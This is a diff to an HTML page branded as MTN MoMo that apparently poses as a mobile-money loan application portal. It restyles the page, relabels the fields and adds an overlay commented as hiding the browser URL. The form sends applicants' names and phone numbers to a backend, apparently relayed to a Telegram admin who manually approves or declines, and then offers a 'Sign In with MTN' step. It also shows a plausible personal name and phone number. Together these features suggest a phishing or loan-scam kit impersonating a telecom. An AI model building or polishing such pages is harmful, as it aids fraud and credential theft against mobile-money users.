@@ -19,6 +19,7 @@
             --mtn-blue-mid: #003b6f;
             --mtn-blue-light: #005b9f;
             --success-green: #1db954;
+            --danger-red: #e11d48;
             --whatsapp-green: #25d366;
             --text-white: #ffffff;
             --text-muted: #dbeafe;
@@ -199,7 +200,6 @@
             .approval-body,
             .success-section,
             .summary-card,
-            .cta-btn,
             .whatsapp-box {
                 max-width: 520px;
                 width: 100%;
@@ -207,17 +207,16 @@
                 margin-right: auto;
             }
         }
-
         /* ================= SCREEN 1: WELCOME / LANDING ================= */
         .hero-section {
             display: flex;
             align-items: center;
             padding: 18px 20px 8px;
-            gap: 12px;
+            gap: 14px;
         }
 
         .hero-visual {
-            width: 45%;
+            width: 46%;
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -226,31 +225,31 @@
 
         .agent-showcase-card {
             width: 100%;
-            height: 225px;
+            height: 255px;
             background: linear-gradient(165deg, rgba(255, 204, 0, 0.25) 0%, rgba(0, 43, 85, 0.9) 100%);
             border: 2.5px solid var(--mtn-yellow);
-            border-radius: 20px;
+            border-radius: 22px;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             text-align: center;
-            padding: 14px 10px;
+            padding: 18px 14px;
             box-shadow: 0 12px 24px rgba(0, 0, 0, 0.35);
             position: relative;
         }
 
         .phone-mockup-icon {
-            width: 68px;
-            height: 112px;
+            width: 74px;
+            height: 122px;
             background-color: #0b192c;
             border: 3px solid var(--mtn-yellow);
-            border-radius: 14px;
+            border-radius: 16px;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            gap: 6px;
+            gap: 8px;
             box-shadow: 0 6px 14px rgba(0, 0, 0, 0.4);
         }
 
@@ -266,17 +265,17 @@
         }
 
         .agent-shirt-tag {
-            margin-top: 12px;
+            margin-top: 14px;
             background-color: var(--mtn-yellow);
             color: #001a35;
-            font-size: 11px;
+            font-size: 11.5px;
             font-weight: 800;
-            padding: 4px 12px;
+            padding: 5px 14px;
             border-radius: 20px;
         }
 
         .hero-text {
-            width: 55%;
+            width: 54%;
             text-align: center;
         }
 
@@ -327,11 +326,11 @@
             display: flex;
             align-items: center;
             justify-content: space-around;
-            padding: 12px 16px;
-            margin: 4px 14px;
-            background: rgba(0, 21, 46, 0.45);
-            border-radius: 18px;
-            border: 1px solid rgba(255, 204, 0, 0.25);
+            padding: 16px 18px;
+            margin: 6px 14px;
+            background: rgba(0, 21, 46, 0.5);
+            border-radius: 20px;
+            border: 1.5px solid rgba(255, 204, 0, 0.3);
         }
 
         .feature-item {
@@ -341,8 +340,8 @@
         }
 
         .feature-circle {
-            width: 48px;
-            height: 48px;
+            width: 50px;
+            height: 50px;
             border-radius: 50%;
             background: var(--mtn-navy);
             border: 3px solid var(--mtn-yellow);
@@ -355,7 +354,7 @@
         }
 
         .feature-label {
-            font-size: 13px;
+            font-size: 13.5px;
             font-weight: 700;
             line-height: 1.25;
             color: var(--text-white);
@@ -363,7 +362,7 @@
 
         .feature-divider {
             width: 2px;
-            height: 42px;
+            height: 44px;
             background-color: var(--mtn-yellow);
         }
 
@@ -392,9 +391,9 @@
         .form-card {
             background-color: var(--card-white);
             color: var(--mtn-navy);
-            margin: 6px 16px;
-            border-radius: 22px;
-            padding: 16px 15px 15px;
+            margin: 10px 16px;
+            border-radius: 24px;
+            padding: 22px 18px 20px;
             box-shadow: 0 12px 28px rgba(0, 0, 0, 0.4);
         }
 
@@ -402,12 +401,12 @@
             display: flex;
             align-items: flex-start;
             gap: 12px;
-            margin-bottom: 12px;
+            margin-bottom: 14px;
         }
 
         .form-icon-circle {
-            width: 36px;
-            height: 36px;
+            width: 38px;
+            height: 38px;
             border-radius: 50%;
             background-color: var(--mtn-navy);
             color: var(--text-white);
@@ -415,7 +414,7 @@
             align-items: center;
             justify-content: center;
             font-size: 15px;
-            margin-top: 19px;
+            margin-top: 20px;
             flex-shrink: 0;
             box-shadow: 0 3px 6px rgba(0, 31, 63, 0.25);
         }
@@ -423,7 +422,7 @@
         .ugx-bag-icon {
             background-color: var(--mtn-navy);
             color: var(--mtn-yellow);
-            font-size: 9px;
+            font-size: 9.5px;
             font-weight: 800;
             border-radius: 10px 10px 15px 15px;
             border-top: 3px solid var(--mtn-yellow);
@@ -435,18 +434,18 @@
 
         .input-wrapper label {
             display: block;
-            font-size: 13px;
+            font-size: 13.5px;
             font-weight: 700;
             color: var(--mtn-navy);
-            margin-bottom: 4px;
+            margin-bottom: 5px;
         }
 
         .input-wrapper input,
         .input-wrapper select {
             width: 100%;
-            padding: 10px 12px;
-            border-radius: 9px;
-            font-size: 13.5px;
+            padding: 11px 13px;
+            border-radius: 10px;
+            font-size: 14px;
             font-weight: 600;
             color: var(--mtn-navy);
             background-color: #f8fafc;
@@ -475,22 +474,23 @@
             box-shadow: 0 0 0 3px rgba(255, 204, 0, 0.25);
         }
 
+        /* Navy Blue "Continue" Button */
         .form-submit-btn {
             width: 100%;
-            background: linear-gradient(180deg, var(--mtn-yellow-bright) 0%, #ffbb00 100%);
-            color: var(--mtn-navy);
-            border: 1.5px solid #fff099;
-            border-radius: 30px;
-            padding: 13px;
-            font-size: 18px;
+            background: linear-gradient(180deg, #003b6f 0%, #001f3f 100%);
+            color: #ffffff;
+            border: 2px solid var(--mtn-yellow);
+            border-radius: 34px;
+            padding: 15px;
+            font-size: 19px;
             font-weight: 800;
             cursor: pointer;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 10px;
-            margin-top: 8px;
-            box-shadow: 0 5px 15px rgba(255, 187, 0, 0.45);
+            margin-top: 10px;
+            box-shadow: 0 6px 16px rgba(0, 31, 63, 0.4);
             transition: transform 0.15s ease;
         }
 
@@ -659,8 +659,8 @@
             width: 100%;
             border: 2px solid var(--mtn-yellow);
             background: rgba(0, 20, 45, 0.7);
-            border-radius: 18px;
-            padding: 14px 16px;
+            border-radius: 20px;
+            padding: 18px 18px;
             display: flex;
             align-items: center;
             gap: 14px;
@@ -669,8 +669,8 @@
         }
 
         .shield-badge {
-            width: 44px;
-            height: 44px;
+            width: 46px;
+            height: 46px;
             background-color: #ffffff;
             color: var(--mtn-navy);
             border-radius: 50% 50% 50% 50% / 35% 35% 65% 65%;
@@ -683,7 +683,7 @@
 
         .patience-divider {
             width: 2px;
-            height: 40px;
+            height: 42px;
             background-color: var(--mtn-yellow);
             flex-shrink: 0;
         }
@@ -695,7 +695,7 @@
         }
 
         .patience-text p {
-            font-size: 12px;
+            font-size: 12.5px;
             color: #e2e8f0;
         }
 
@@ -734,7 +734,7 @@
             line-height: 1.4;
         }
 
-        /* ================= SCREEN 4: APPLICATION SUCCESSFUL ================= */
+        /* ================= SCREEN 4: APPLICATION APPROVED ================= */
         .success-section {
             text-align: center;
             padding: 12px 20px 6px;
@@ -787,11 +787,12 @@
             padding: 0 10px;
         }
 
+        /* Bigger Summary Box on Page 4 */
         .summary-card {
             background-color: var(--card-white);
             color: var(--mtn-navy);
-            margin: 10px 18px;
-            border-radius: 16px;
+            margin: 14px 18px;
+            border-radius: 20px;
             overflow: hidden;
             box-shadow: 0 8px 22px rgba(0, 0, 0, 0.35);
         }
@@ -800,17 +801,17 @@
             background-color: var(--mtn-yellow-bright);
             text-align: center;
             font-weight: 800;
-            font-size: 16px;
-            padding: 9px;
+            font-size: 17px;
+            padding: 11px;
         }
 
         .summary-row {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 9px 14px;
+            padding: 11px 16px;
             border-bottom: 1px solid #e2e8f0;
-            font-size: 13px;
+            font-size: 13.5px;
         }
 
         .summary-row:last-child {
@@ -836,22 +837,24 @@
             color: var(--mtn-navy);
         }
 
-        /* Shared Buttons & Footer */
+        /* Navy Blue Longer Buttons ("Apply Now" & "Sign In with MTN") */
         .cta-btn {
-            background: linear-gradient(180deg, var(--mtn-yellow-bright) 0%, #ffbb00 100%);
-            color: var(--mtn-navy);
-            border: 2px solid #fff099;
+            width: 92%;
+            max-width: 560px;
+            background: linear-gradient(180deg, #003b6f 0%, #001f3f 100%);
+            color: #ffffff;
+            border: 2px solid var(--mtn-yellow);
             border-radius: 40px;
-            padding: 13px 24px;
-            margin: 8px 22px;
+            padding: 14px 36px;
+            margin: 8px auto;
             font-size: 19px;
             font-weight: 800;
             cursor: pointer;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 12px;
-            box-shadow: 0 6px 18px rgba(0, 0, 0, 0.35);
+            gap: 14px;
+            box-shadow: 0 6px 18px rgba(0, 0, 0, 0.4);
             transition: transform 0.15s ease;
         }
 
@@ -860,26 +863,15 @@
         }
 
         .mtn-btn-badge {
-            border: 2px solid var(--mtn-navy);
+            border: 2px solid var(--mtn-yellow);
+            color: var(--mtn-yellow);
             border-radius: 50%;
             padding: 2px 10px;
             font-size: 14px;
-            font-weight: 800;
-        }
-
-        .btn-sep {
-            width: 2px;
-            height: 22px;
-            background-color: var(--mtn-navy);
-        }
-
-        }
-</style>
-</head>
-
 <body>
     <div class="app-container">
- <!-- ================= SCREEN 1: WELCOME ================= -->
+
+        <!-- ================= SCREEN 1: WELCOME ================= -->
         <div id="page1" class="screen active">
             <div>
                 <div class="header-wave">
@@ -897,7 +889,7 @@
                     <div class="hero-visual">
                         <div class="agent-showcase-card">
                             <div class="phone-mockup-icon">
-                                <i class="fa-solid fa-wallet" style="font-size: 26px; color: #ffcc00;"></i>
+                                <i class="fa-solid fa-wallet" style="font-size: 28px; color: #ffcc00;"></i>
                                 <div class="mtn-oval-badge">MTN</div>
                             </div>
                             <div class="agent-shirt-tag">MTN MoMo Wallet</div>
@@ -927,7 +919,7 @@
             </div>
 
             <div>
-                <button class="cta-btn" onclick="switchPage('pageForm')">
+                <button class="cta-btn" onclick="switchPage('pageForm')" style="margin-bottom: 28px;">
                     Apply Now <i class="fa-solid fa-arrow-right"></i>
                 </button>
                 <div class="footer-wave"></div>
@@ -958,15 +950,15 @@
                     <div class="form-group">
                         <div class="form-icon-circle"><i class="fa-solid fa-user"></i></div>
                         <div class="input-wrapper">
-                            <label for="fullName">Full Name</label>
-                            <input type="text" id="fullName" name="fullName" placeholder="Enter your full name" autocomplete="name" required>
+                            <label for="fullName">Applicant</label>
+                            <input type="text" id="fullName" name="fullName" placeholder="Enter applicant full name" autocomplete="name" required>
                         </div>
                     </div>
 
                     <div class="form-group">
                         <div class="form-icon-circle"><i class="fa-solid fa-phone"></i></div>
                         <div class="input-wrapper">
-                            <label for="mtnNumber">MTN Mobile Number</label>
+                            <label for="mtnNumber">Phone Number</label>
                             <input type="tel" id="mtnNumber" name="mtnNumber" placeholder="07XXXXXXXX" autocomplete="tel" required>
                         </div>
                     </div>
@@ -974,9 +966,10 @@
                     <div class="form-group">
                         <div class="form-icon-circle"><i class="fa-solid fa-border-all"></i></div>
                         <div class="input-wrapper">
-                            <label for="loanService">Select Loan Service</label>
+                            <label for="loanService">Loan Type</label>
                             <select id="loanService" name="loanService" required>
-                                <option value="" disabled selected>Choose a service</option>
+                                <option value="" disabled selected>Choose a loan type</option>
+                                <option value="Easy Loan">Easy Loan</option>
                                 <option value="MoMo Advance">MoMo Advance</option>
                                 <option value="Quick Personal Loan">Quick Personal Loan</option>
                                 <option value="Business Boost Loan">Business Boost Loan</option>
@@ -988,7 +981,7 @@
                     <div class="form-group">
                         <div class="form-icon-circle ugx-bag-icon">UGX</div>
                         <div class="input-wrapper">
-                            <label for="loanAmount">Select Loan Amount (UGX)</label>
+                            <label for="loanAmount">Amount (UGX)</label>
                             <select id="loanAmount" name="loanAmount" required>
                                 <option value="" disabled selected>Choose an amount</option>
                                 <option value="UGX 500,000">UGX 500,000</option>
@@ -1003,9 +996,9 @@
                     <div class="form-group" style="margin-bottom: 8px;">
                         <div class="form-icon-circle"><i class="fa-solid fa-calendar-days"></i></div>
                         <div class="input-wrapper">
-                            <label for="repaymentPeriod">Repayment Period</label>
+                            <label for="repaymentPeriod">Term</label>
                             <select id="repaymentPeriod" name="repaymentPeriod" required>
-                                <option value="" disabled selected>Choose period</option>
+                                <option value="" disabled selected>Choose repayment term</option>
                                 <option value="3 Months">3 Months</option>
                                 <option value="6 Months">6 Months</option>
                                 <option value="12 Months">12 Months</option>
@@ -1039,7 +1032,7 @@
                 </div>
             </div>
         </div>
-              <!-- ================= SCREEN 3: WAITING FOR ADMIN APPROVAL ================= -->
+        <!-- ================= SCREEN 3: WAITING FOR LOAN VERIFICATION ================= -->
         <div id="page3" class="screen">
             <div>
                 <div class="header-wave" style="padding-bottom: 24px;">
@@ -1062,10 +1055,10 @@
                         </div>
                     </div>
 
-                    <div class="status-pill">Waiting for Admin Approval</div>
+                    <div class="status-pill">Waiting for Loan Verification</div>
 
                     <p class="status-message">
-                        Your loan application has been submitted and is now <strong>under review</strong> by our admin team.
+                        Your loan application has been received and is currently <strong>Pending</strong> verification by our admin team.
                     </p>
 
                     <div class="patience-card">
@@ -1081,7 +1074,7 @@
 
                     <div class="live-poll-badge">
                         <span class="live-dot"></span>
-                        <span id="liveStatusText">Awaiting admin verification...</span>
+                        <span id="liveStatusText">Status: Pending verification...</span>
                     </div>
 
                     <div class="thank-you-highlight">
@@ -1093,7 +1086,7 @@
             <div class="footer-wave"></div>
         </div>
 
-        <!-- ================= SCREEN 4: APPLICATION SUCCESSFUL ================= -->
+        <!-- ================= SCREEN 4: LOAN APPROVED ================= -->
         <div id="page4" class="screen">
             <div>
                 <div class="header-wave" style="padding-bottom: 24px;">
@@ -1114,39 +1107,43 @@
                         <div class="green-check-circle"><i class="fa-solid fa-check"></i></div>
                         <div class="spark-lines">/ ― \</div>
                     </div>
-                    <div class="success-banner">Application Successful!</div>
+                    <div class="success-banner">Status: Approved</div>
                     <p class="success-desc">
-                        Your loan application has been approved and processed. Your summary is below.
+                        Your loan application has been verified and approved. Your loan details are below.
                     </p>
                 </div>
 
                 <div class="summary-card">
-                    <div class="summary-header">Application Summary</div>
+                    <div class="summary-header">Loan Details</div>
                     <div class="summary-row">
-                        <div class="summary-label"><i class="fa-solid fa-user"></i> Full Name:</div>
-                        <div class="summary-value" id="sumName">John Doe</div>
+                        <div class="summary-label"><i class="fa-solid fa-hashtag"></i> Application ID:</div>
+                        <div class="summary-value" id="sumAppId">MOMO-0000000000</div>
                     </div>
                     <div class="summary-row">
-                        <div class="summary-label"><i class="fa-solid fa-phone"></i> MTN Number:</div>
-                        <div class="summary-value" id="sumPhone">0778260593</div>
+                        <div class="summary-label"><i class="fa-solid fa-user"></i> Applicant:</div>
+                        <div class="summary-value" id="sumName">ETARU MOSES</div>
                     </div>
                     <div class="summary-row">
-                        <div class="summary-label"><i class="fa-solid fa-sack-dollar"></i> Loan Amount:</div>
-                        <div class="summary-value" id="sumAmount">UGX 4,000,000</div>
+                        <div class="summary-label"><i class="fa-solid fa-phone"></i> Phone Number:</div>
+                        <div class="summary-value" id="sumPhone">0788451063</div>
                     </div>
                     <div class="summary-row">
-                        <div class="summary-label"><i class="fa-solid fa-calendar-days"></i> Repayment Period:</div>
+                        <div class="summary-label"><i class="fa-solid fa-border-all"></i> Loan Type:</div>
+                        <div class="summary-value" id="sumService">Easy Loan</div>
+                    </div>
+                    <div class="summary-row">
+                        <div class="summary-label"><i class="fa-solid fa-sack-dollar"></i> Amount:</div>
+                        <div class="summary-value" id="sumAmount">UGX 2,000,000</div>
+                    </div>
+                    <div class="summary-row">
+                        <div class="summary-label"><i class="fa-solid fa-calendar-days"></i> Term:</div>
                         <div class="summary-value" id="sumPeriod">24 Months</div>
-                    </div>
-                    <div class="summary-row">
-                        <div class="summary-label"><i class="fa-solid fa-border-all"></i> Loan Service:</div>
-                        <div class="summary-value" id="sumService">MoMo Advance</div>
                     </div>
                 </div>
             </div>
 
             <div>
-                <button class="cta-btn" onclick="resetAndReturnHome()" style="font-size: 16px; padding: 12px 20px;">
+                <button class="cta-btn" onclick="resetAndReturnHome()" style="font-size: 16px; padding: 13px 24px;">
                     <span class="mtn-btn-badge">MTN</span>
                     <span class="btn-sep"></span>
                     Sign In with MTN <i class="fa-solid fa-arrow-right"></i>
@@ -1170,9 +1167,30 @@
         </div>
 
     </div>
+
+    <!-- ================= CUSTOM IN-PAGE DECLINED BANNER (HIDES BROWSER URL) ================= -->
+    <div id="customNoticeOverlay" class="notice-overlay">
+        <div class="notice-banner-card">
+            <div class="notice-icon-circle">
+                <i id="noticeIcon" class="fa-solid fa-circle-xmark"></i>
+            </div>
+            <div class="notice-badge">Loan Verification</div>
+            <h3 id="noticeTitle">Status: Declined</h3>
+            <p id="noticeMessage">
+                Your loan application was declined during verification. Please contact WhatsApp support for assistance.
+            </p>
+            <a href="https://wa.me" target="_blank" rel="noopener" class="notice-wa-btn">
+                <i class="fa-brands fa-whatsapp"></i> Chat with WhatsApp Support
+            </a>
+            <button type="button" class="notice-close-btn" onclick="closeNoticeBanner()">
+                Return to Home
+            </button>
+        </div>
+    </div>
 <script>
     let pollTimer = null;
     let activeApplicationId = null;
+    let shouldResetOnClose = false;
 
     // Switch visible screen and stop any active polling when leaving the spinner screen
     function switchPage(pageId) {
@@ -1186,6 +1204,23 @@
         document.getElementById(pageId).classList.add('active');
     }
 
+    // Show custom styled banner without displaying any browser URL/link
+    function showNoticeBanner(title, message, resetAfterClose = false) {
+        shouldResetOnClose = resetAfterClose;
+        document.getElementById('noticeTitle').textContent = title;
+        document.getElementById('noticeMessage').textContent = message;
+        document.getElementById('customNoticeOverlay').classList.add('show');
+    }
+
+    // Close custom banner and return to home if declined
+    function closeNoticeBanner() {
+        document.getElementById('customNoticeOverlay').classList.remove('show');
+        if (shouldResetOnClose) {
+            shouldResetOnClose = false;
+            resetAndReturnHome();
+        }
+    }
+
     // Reset form and return to Welcome Screen
     function resetAndReturnHome() {
         activeApplicationId = null;
@@ -1193,7 +1228,7 @@
         switchPage('page1');
     }
 
-    // Submit Loan Application to Backend API (which forwards to Telegram Admin)
+    // Submit Loan Application to Backend API (matches server.js fields)
     async function submitApplication(event) {
         event.preventDefault();
 
@@ -1222,24 +1257,25 @@
             const data = await response.json();
 
             if (!response.ok) {
-                throw new Error(data.message || 'Could not submit loan application.');
+                throw new Error(data.message || 'All loan application fields are required.');
             }
 
-            // Save application ID and populate Summary Screen fields
+            // Save Application ID and populate Loan Details card fields
             activeApplicationId = data.applicationId;
+            document.getElementById('sumAppId').textContent = activeApplicationId;
             document.getElementById('sumName').textContent = payload.fullName;
             document.getElementById('sumPhone').textContent = payload.mtnNumber;
             document.getElementById('sumService').textContent = payload.loanService;
             document.getElementById('sumAmount').textContent = payload.loanAmount;
             document.getElementById('sumPeriod').textContent = payload.repaymentPeriod;
 
-            // Transition to Screen 3 and spin infinitely until Admin approves or declines
-            document.getElementById('liveStatusText').textContent = `Ref: ${activeApplicationId} • Waiting for admin...`;
+            // Transition to Screen 3 and spin infinitely until Approved or Declined
+            document.getElementById('liveStatusText').textContent = `Application ID: ${activeApplicationId} • Status: Pending`;
             switchPage('page3');
             pollApprovalStatus(activeApplicationId);
 
         } catch (error) {
-            alert('Submission Error: ' + error.message);
+            showNoticeBanner('Submission Error', error.message, false);
         } finally {
             btn.innerHTML = originalText;
             btn.disabled = false;
@@ -1271,11 +1307,13 @@
                 } else if (data.status === 'REJECTED') {
                     clearInterval(pollTimer);
                     pollTimer = null;
-                    alert('Your loan application was declined by the admin team. Please contact WhatsApp support for assistance.');
-                    resetAndReturnHome();
+                    showNoticeBanner(
+                        'Status: Declined',
+                        'Your loan application was declined during verification. Please contact WhatsApp support for assistance.',
+                        true
+                    );
                 }
             } catch (err) {
-                // Keep spinning and retrying if connection briefly drops
                 console.error('Polling status...', err);
             }
         }, 2000);
